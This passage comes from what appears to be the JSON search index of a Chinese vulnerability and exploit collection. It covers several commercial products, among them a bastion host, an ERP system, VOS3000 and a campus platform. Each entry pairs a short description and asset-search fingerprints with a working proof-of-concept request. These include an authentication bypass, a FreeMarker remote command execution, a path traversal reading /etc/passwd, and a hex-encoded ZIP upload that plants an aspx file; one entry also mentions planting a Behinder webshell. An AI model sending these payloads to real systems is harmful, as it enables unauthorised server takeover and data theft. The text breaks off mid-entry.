/gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Cookie: 0_styleName=styleA ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text Test ------WebKitFormBoundaryFfJZ4PlAZBixjELj-- /GTP/IM/Services/Group/Upload/xxx-xxx-test.aspx ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"思福迪堡垒机 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 思福迪堡垒机存在任意⽤户登录漏洞，恶意攻击者可以绕过堡垒机的密码登录验证机制，以任 意⽤户身份随意登录堡垒机Web管理界⾯，并可以正常的使⽤账户权限去操作。 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 思福迪堡垒机 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Logbase运维安全管理系统\" ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 获取INFO字段，u1参数值为⽤户名 POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin\u0026m1= 获得：{“result”:true,“info”:“1562205376847”,“ErrMsg”:\"\"} 带⼊INFO字段进⼊如下请求的 a0 参数值中,uCode参数值为⽤户名 POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847\u0026a1=\u0026a10=2019-01- 01+10:10:10\u0026ha=CADFDF26E649FB6284D2FD424BD294B6\u0026uCode=admin\u0026vdcode= 利用后即可登录后台 ","date":"0001-01-01","objectID":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"思迪数据 Home 登录绕过漏洞 ","date":"0001-01-01","objectID":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 思迪数据存在登录绕过漏洞，通过访问特殊路径即可获取后台权限 ","date":"0001-01-01","objectID":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 思迪数据 ","date":"0001-01-01","objectID":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"思迪数据\" ","date":"0001-01-01","objectID":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 访问 http://xxx.xxx.xxx.xxx/Home ","date":"0001-01-01","objectID":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%80%9D%E8%BF%AA%E6%95%B0%E6%8D%AE-home-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"拓尔思 TRS testCommandExecutor.jsp 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 拓尔思 TRS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 拓尔思-TRS ","date":"0001-01-01","objectID":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"TRS媒资管理系统登录页面\" ","date":"0001-01-01","objectID":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /mas/front/vod/main.do?method=newList\u0026view=forward:/sysinfo/testCommandExecutor.jsp\u0026cmdLine=dir\u0026workDir=\u0026pathEnv=\u0026libPathEnv= ","date":"0001-01-01","objectID":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%8B%93%E5%B0%94%E6%80%9D-trs-testcommandexecutor.jsp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"新开普 前置服务管理平台 service.action 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 新开普 前置服务管理平台 ","date":"0001-01-01","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"掌上校园服务管理平台\" ","date":"0001-01-01","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /service_transport/service.action HTTP/1.1 Host: Accept: */* Content-Type: application/json {\"command\":\"GetFZinfo\",\"UnitCode\":\"\u003c#assign ex = \\\"freemarker.template.utility.Execute\\\"?new()\u003e${ex(\\\"cmd /c echo Test \u003e ./webapps/ROOT/Test.txt\\\")}\"} ","date":"0001-01-01","objectID":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"昆石网络 VOS3000虚拟运营支撑系统 %c0%ae%c0%ae 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 昆石网络 VOS3000虚拟运营支撑系统 通过 %c0%ae%c0%ae 等字符绕过检测，可导致任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 昆石网络 VOS3000虚拟运营支撑系统 ","date":"0001-01-01","objectID":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"VOS-VOS3000\" ","date":"0001-01-01","objectID":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd ","date":"0001-01-01","objectID":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-vos3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F--%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 明源云 ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器 ","date":"0001-01-01","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 明源云 ERP系统接口管家 ","date":"0001-01-01","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"接口管家站点正常！\" ","date":"0001-01-01","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 漏洞存在于某端口下的接口管家服务 验证POC POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1 Host: Accept-Encoding: gzip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 856 {{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}} 访问地址： /fdccloud/_/test.aspx ","date":"0001-01-01","objectID":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%98%8E%E6%BA%90%E4%BA%91-erp%E7%B3%BB%E7%BB%9F-%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6-apiupdate.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"智慧校园管理系统 前台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 智慧校园管理系统前台注册页面存在文件上传，由于没有对上传的文件进行审查导致可上传恶意文件控制服务器 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 智慧校园管理系统 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"DC_Login/QYSignUp\" ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下，只要存在企业用户注册就可能出现漏洞 这个地方的上传附件允许了任意文件上传，包括 aspx木马，上传后还会返回 webshell地址 上传的是冰蝎木马，直接连接 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"杭州法源软件 公证实务教学软件 SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 杭州法源软件 公证实务教学软件 存在SQL注入漏洞 